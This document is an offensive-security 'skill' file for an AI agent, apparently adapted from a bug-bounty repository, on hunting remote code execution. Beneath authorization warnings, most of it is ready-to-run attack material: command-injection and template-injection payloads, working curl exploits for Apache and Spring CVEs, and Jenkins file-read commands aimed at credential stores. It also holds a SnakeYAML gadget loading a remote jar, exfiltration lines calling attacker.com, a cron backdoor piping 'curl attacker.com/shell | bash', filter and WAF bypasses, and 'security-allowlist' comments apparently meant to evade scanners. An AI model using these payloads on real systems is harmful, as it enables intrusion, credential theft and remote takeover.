---
name: hunt-rce
description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty
  reports. Use when hunting rce on any target.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public
report_count: 87
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Autonomous Testing Priority

**Content-type is the #1 silent failure mode for command injection.**

Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, returning a plausible 200 response. You get a false negative with no indication anything went wrong.

**Rule:** If the page has an HTML form (`<form method="POST">`), use form-encoding. If the path is `/api/...` or the response is JSON, use JSON.

**Command injection operators to try (in order of prevalence):**
```
value;id        ← Unix semicolon (most common)
value|id        ← pipe
value&&id       ← AND
value$(id)      ← subshell
value`id`       ← backtick
```

**Proof:** OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, exploitation is confirmed.

---

## Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

## Attack Surface Signals

### URL Patterns
```
/management-console/*
/admin/settings/*
/api/v*/exec
/api/v*/run
/webhook/*
/_internal/*
/import?url=
/render?template=
/preview?format=
```

### Response Headers / Tech Stack Signals
```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals
```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput) <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

### Tech Stack Signals
| Signal | RCE Vector |
|--------|-----------|
| `nomad` in config UI | Template injection → `{{ ... }}` |
| `syslog-ng` config editable | Config injection → `program()` destination |
| `collectd` config editable | Plugin exec injection |
| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
| npm `package.json` internal scope | Dependency confusion |
| ingress-nginx annotations | Path field regex bypass |

---

## Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.

8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.

9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.

10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"

---

## Payload & Detection Patterns

### Template Injection Probes
```
# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
{{'7'*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Nomad template injection (Go text/template)
{{ env "NOMAD_SECRET_ID" }}
{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}
{{ runscript "id" }}
```

### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)

Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:

- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only
- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution

**Version fingerprint:**
```bash
curl -sI http://target/ | grep -i "Server:"
# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
# Patched:    Apache/2.4.51+
```

**File-read test (any alias):**
```bash
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# Note: --path-as-is is REQUIRED — curl normalizes %2e by default
```

**RCE test (cgi-enabled alias only):**
```bash
curl --path-as-is -X POST \
  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.

### Spring Cloud Function SpEL injection (CVE-2022-22963)

Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.

**Detection:**
- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
- Version banner via `/actuator/info` or response headers

**Exploit:**
```bash
curl -X POST http://target:8080/functionRouter \
  -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.

**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `hunt-ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).

### SnakeYAML RCE Gadget
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

### Ruby YAML / rdoc_options RCE
```yaml
--- !ruby/object:Gem::Installer
i: x
```

### Dependency Confusion Detection
```bash
# Find internal package names
grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'
# Check if public registry has higher version
npm view @target-company/internal-package version 2>/dev/null
```

### Ingress-nginx Path Injection
```
# In spec.rules.http.paths.path
/something)(;.*);#
# Results in nginx config injection
```

### Kubernetes Exposed API Check
```bash
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
```

### Out-of-Band RCE Confirmation
```bash
# Payload to confirm blind RCE via DNS
curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
nslookup $(whoami).attacker.com
wget http://attacker.com/$(cat /etc/hostname)
```

### ActiveStorage Path Traversal → RCE
```
# Filename in upload request
filename="../../../../etc/cron.d/backdoor"
# Cron payload content
* * * * * root curl http://attacker.com/shell | bash <!-- security-allowlist: curl-pipe-bash -->
```

### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)

Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).

**Detection:**
- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`

**Test (Jenkins):**
```bash
# Get the legit CLI jar from the target
curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar

# First line of file leaks via 'help' error
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash

# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)
java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
# → All passwd lines echoed back

# Recon: env vars + JENKINS_HOME path
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ
```

**Crown-jewel files after JENKINS_HOME confirmed:**
- `/var/jenkins_home/secret.key` — master encryption key for stored credentials
- `/var/jenkins_home/secrets/master.key` — derives the encryption key
- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens

**Pattern generalizes beyond Jenkins.** Any Java service that:
1. Embeds args4j (most enterprise Java CLIs since 2010s)
2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)
3. Returns argument-parsing errors verbatim to the client

→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.

### Grep Patterns for Source Review
```bash
# Command injection sinks
grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .
grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .

# Template engine instantiation
grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .

# Unsafe YAML load
grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument
grep -rn "Yaml()\|new Yaml()" --include="*.java" .
```

---

## Common Root Causes

**1. Configuration-as-code with insufficient sanitization**
Administrators edit configuration files (syslog-ng, collectd, nomad) through web UIs. Developers assume admin == trusted, so they pass field values directly into config files that support execution primitives (`program()` destinations, exec plugins, template functions).

**2. Template engines in privileged contexts**
Go's `text/template`, Freemarker, Velocity, and Twig are used for system configuration rendering. When user-controlled strings reach these engines without sandboxing, arbitrary code follows.

**3. Dependency confusion / namespace squatting**
Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.

**4. Unsafe deserialization of YAML/XML**
Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.

**5. Path traversal in file operation chains**
Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.

**6. Assuming low-privilege roles can't reach execution contexts**
The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.

**7. Missing input validation on infrastructure-facing fields**
Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.

---

## Bypass Techniques

### Bypass: Shell metacharacter filtering
```bash
# Blocked: ; | & ` $()
# Bypass using $IFS and encodings
cat${IFS}/etc/passwd
{cat,/etc/passwd}
$'\x63\x61\x74' /etc/passwd  # hex encoding
$(printf '\x63\x61\x74') /etc/passwd

# Newline injection when semicolons blocked
payload=$'\ncurl attacker.com\n'
```

### Bypass: URL scheme allowlist (javascript: blocked)
```
# Mobile apps often block javascript: but miss:
jAvAsCrIpT:alert(1)          # case variation
javascript&#58;alert(1)      # HTML entity
javascript:void(alert(1))    # void wrapper
intent://attacker.com#Intent;scheme=javascript;...
data:text/html,<script>alert(1)</script>
```

### Bypass: YAML safe_load / type restrictions
```yaml
# If !!java.* is blocked, try legitimate classes with side effects
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: 'ldap://attacker.com/a'
  autoCommit: true
# Or find allowlisted types with dangerous constructors
```

### Bypass: npm scope restrictions
```
# If @company/* is monitored, look for unscoped internal names
# e.g., "internal-utils" instead of "@company/internal-utils"
# Public registries serve unscoped packages first
```

### Bypass: Path traversal filters
```
# Basic filter bypass
../           → ..%2F → %2e%2e%2f → ....// 
# Double encoding
%252e%252e%252f
# Unicode normalization
..%c0%af  (overlong UTF-8)
# Null byte (older systems)
../../etc/passwd%00.jpg
```

### Bypass: Template injection with output filtering
```
# If {{ }} is sanitized on output but not evaluation:
{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
# Blind — use DNS callback instead of output
{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
```

### Bypass: WAF blocking `exec`, `system`, `popen`
```ruby
# Ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

---


## Contents

- [Gate 0 Validation](references/details.md)
- [Real Impact Examples](references/details.md)
- [Chains & Compositions (Senior Hunting)](references/details.md)
- [Related Skills & Chains](references/details.md)

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
